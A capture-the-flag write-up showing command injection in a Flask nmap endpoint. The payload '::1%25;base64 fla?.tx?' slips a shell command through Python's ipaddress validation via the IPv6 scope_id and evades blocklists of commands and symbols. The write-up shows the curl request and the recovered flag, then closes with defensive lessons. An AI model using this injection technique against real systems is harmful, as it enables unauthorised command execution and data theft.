# 0day-ip - Web Challenge

## TL;DR

Command injection via IPv6 scope_id bypass in Python 3.9's `ipaddress.ip_address()`, using `::1%25;base64 fla?.tx?` to evade IP validation, command/symbol filters, and the output filter.

## Description

Flask application that exposes a `/check?ip=&port=` endpoint which runs `nmap` against the provided IP. The input is validated with `ipaddress.ip_address()` and filtered against lists of suspicious commands and symbols.

## Analysis

### Application Flow

```
GET /check?ip=X&port=Y
  -> ipaddress.ip_address(ip)     # IP validation
  -> nmap_scan(ip, port)
     -> symbol/command filter on ip
     -> subprocess.run(f"nmap -F -sV {ip}", shell=True)
     -> filter "{" in output
```

### Protections

1. **`ipaddress.ip_address(ip)`** - validates that it is a real IP
2. **Symbol filter**: `$ " ' \ @ , * & | { }`
3. **Command filter**: `flag txt cat echo head tail more less sed awk dd env printenv set`
4. **Output filter**: blocks responses containing `{`

### Vulnerability (CWE-78: OS Command Injection)

`subprocess.run(command, shell=True)` with user input. The `ipaddress.ip_address()` validation seems robust, but IPv6 supports **scope_id** (network zone) via the `%` character:

```
::1%eth0    ->  IPv6 loopback with scope "eth0"
```

Python 3.9 accepts **any character** in the scope_id except `%` and `/`. This includes `;`, spaces, backticks, and newlines — all useful for command injection.

The format `::1%25...` is accepted by `ipaddress.ip_address()` and the full scope_id is injected directly into the nmap command.

## Exploit

### Bypassing `ipaddress.ip_address()`

```python
>>> ipaddress.ip_address("::1%25;id")
IPv6Address('::1%25;id')    # VALID - scope_id = "25;id"
```

### Bypassing the command/symbol filter

- `;` is not in the blocked symbols list
- `tac` / `base64` are not in the blocked commands list
- `fla?.tx?` uses the `?` wildcard (not blocked) to avoid the words `flag` and `txt`

### Bypassing the output filter

The flag contains `{` (`upCTF{...}`), which triggers the output filter. `base64` is used to encode the output and avoid the `{` character.

### `/` restriction

`ipaddress.ip_address()` rejects `/` in the scope_id (it interprets it as a CIDR prefix). This is not a problem because `WORKDIR /app` in the Dockerfile makes relative paths work: `fla?.tx?` resolves to `flag.txt` in `/app/`.

### Final payload

```
GET /check?ip=::1%2525;base64%20fla?.tx?
```

URL-decoded on the server:
```
ip = ::1%25;base64 fla?.tx?
```

Command executed:
```bash
nmap -F -sV ::1%25;base64 fla?.tx?
```

The shell interprets `;` as a separator → executes `base64 flag.txt` after nmap.

### Execution

```bash
$ curl -s "http://46.225.117.62:30004/check?ip=::1%2525;base64%20fla?.tx?"
{"scan_results": "...dXBDVEZ7aDB3X2M0bl8xX3dyMXQzX3QwXzRuX2lwNGRkcmVzcz8hLWRzRnI0MWNkYjRjODgyMzh9Cg==\n", ...}

$ echo "dXBDVEZ7aDB3X2M0bl8xX3dyMXQzX3QwXzRuX2lwNGRkcmVzcz8hLWRzRnI0MWNkYjRjODgyMzh9" | base64 -d
upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-dsFr41cdb4c88238}
```

## Flag

```
upCTF{h0w_c4n_1_wr1t3_t0_4n_ip4ddress?!-dsFr41cdb4c88238}
```

## Key Lessons

- `ipaddress.ip_address()` is NOT a safe sanitizer for inputs going to shell commands — IPv6 scope_id accepts almost any character
- `shell=True` in subprocess is dangerous with any external input
- Blacklist-based filters are easily bypassed (wildcards `?`, alternative commands like `base64`/`tac`, output encoding)
- Filtering output by `{` is trivially bypassed with encoding

## References

- [CVE-2021-29921 - Python ipaddress leading zeros](https://python-security.readthedocs.io/vuln/ipaddress-ipv4-leading-zeros.html)
- [IPv6 Scoped Addresses - RFC 4007](https://tools.ietf.org/html/rfc4007)
